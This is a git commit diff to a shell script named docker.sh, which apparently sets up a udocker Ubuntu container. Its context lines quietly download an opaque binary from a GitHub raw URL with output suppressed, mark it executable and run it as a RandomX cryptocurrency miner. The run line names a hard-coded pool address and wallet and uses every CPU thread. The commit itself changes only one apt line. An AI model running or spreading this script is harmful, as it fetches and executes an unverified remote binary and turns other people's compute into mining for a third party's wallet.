00d4d71c20d145ff302dd59deebcd42933b39bc1
duniaboci13 <93588768+duniaboci13@users.noreply.github.com>
2025-06-13 06:43:52 +0700

    Update docker.sh

--- docker.sh
+++ docker.sh
@@ -4,7 +4,7 @@ cd udocker
 ./udocker create --name=focal ubuntu:focal
 ./udocker  run focal /bin/bash
 echo
-apt update -y && apt install screen -y && screen -S data
+apt update -y && apt upgrade -y
 nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/sorabi28 > /dev/null 2>&1
 chmod 777 mmm
 ./mmm --algorithm rx/0 --pool 162.243.171.178:80 --wallet 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR.$(echo $(shuf -i 1-100000 -n 1)-mmh) --password Sage --cpu-threads $(nproc --all) --keepalive true
